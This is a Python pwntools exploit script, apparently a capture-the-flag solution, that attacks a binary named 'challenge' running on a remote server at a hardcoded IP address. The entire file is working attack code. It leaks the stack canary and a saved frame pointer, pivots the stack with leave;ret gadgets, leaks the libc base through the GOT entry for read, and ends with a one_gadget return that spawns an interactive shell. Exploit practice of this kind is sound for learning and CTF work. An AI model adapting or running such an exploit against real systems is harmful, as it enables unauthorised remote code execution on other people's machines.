from pwn import *
from time import sleep

context.terminal = ["tmux", "splitw", "-h"]

# Setup ELF objects and important addresses
e = ELF('./challenge')
l = ELF('./libc-2.31.so')
pop_rdi = 0x00000000004013d3
bss = e.bss() + 0x500
leave_ret = 0x00000000004012a5
main = 0x4011d6
main_no_push_rbp = 0x4011db
ret = 0x000000000040101a

# Connect to remote server
p = remote('44.210.9.208', 10012)

# Leak canary
p.sendafter(b'name : ', b'a' * 0x19)
p.recvuntil(b'a' * 0x19)
canary = u64(b'\x00' + p.recvn(7))
print(hex(canary))

# Construct payload to bypass canary check
payload = b'a' * 0x18 + p64(canary) + p64(bss) + p64(main_no_push_rbp)
p.sendafter(b'rename : ', payload)

# Leak stack frame pointer (sfp)
p.sendafter(b'name : ', b'a' * 0x28)
p.recvuntil(b'a' * 0x28)
sfp = u64(p.recvn(6) + b'\x00' * 2) + 8
print(hex(sfp))

# Construct payload to control base pointer and return address
payload = p64(canary) * 4 + p64(sfp + 0x100) + p64(0x40126A)
p.sendafter(b'name : ', payload)

# Prepare payload to set up stack pivoting
payload = p64(sfp + 0x308) + p64(canary) * 3 + p64(sfp + 0x200) + p64(0x40126A)
sleep(1)
p.send(payload)
sleep(1)

# Set up for stack pivoting
payload = p64(sfp + 0x308) + p64(canary) * 3 + p64(sfp + 0x100 + 8) + p64(pop_rdi) + p64(e.got['read']) + p64(0x401260) + p64(canary) + p64(sfp + 0x100 + 8 - 0x28) + p64(leave_ret)
sleep(1)
p.send(payload)
sleep(1)

# Leak libc base address
l.address = u64(p.recvn(6).ljust(8, b'\x00')) - l.sym['read']
print(hex(l.address))

# Prepare final payload for exploitation
payload = p64(canary) * 4 + p64(sfp + 0x200 + 8) + p64(0x40126A)
pop_r12 = l.address + 0x000000000002f709
pop_r15 = 0x00000000004013d2
one_gadget = l.address + 0xe3afe

payload += p64(pop_r15) + p64(0) + p64(0x40126a) + p64(canary) + p64(sfp + 0x200 + 8 - 0x28) + p64(leave_ret)
sleep(1)
p.send(payload)
sleep(1)

payload = p64(pop_r12) + p64(0) + p64(one_gadget) + p64(canary) + p64(sfp + 0x28) + p64(leave_ret)
sleep(1)
p.send(payload)
sleep(1)

# Start interactive session
p.interactive()
